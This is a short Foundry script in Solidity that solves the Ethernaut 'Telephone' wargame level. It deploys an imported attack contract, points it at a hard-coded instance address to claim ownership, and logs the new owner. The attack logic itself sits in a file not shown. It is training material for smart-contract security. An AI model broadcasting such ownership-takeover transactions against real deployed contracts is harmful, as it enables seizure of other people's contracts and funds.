// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import {attackTelephon} from "../../src/ethernaut/telephone.sol";
import "forge-std/console.sol";

contract claimOwnership is Script {
    attackTelephon tt;

    function run() public {
        vm.startBroadcast();
        tt = new attackTelephon();
        tt.attack(0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7);
        console.log(tt.newOwner());
        vm.stopBroadcast();
    }
}
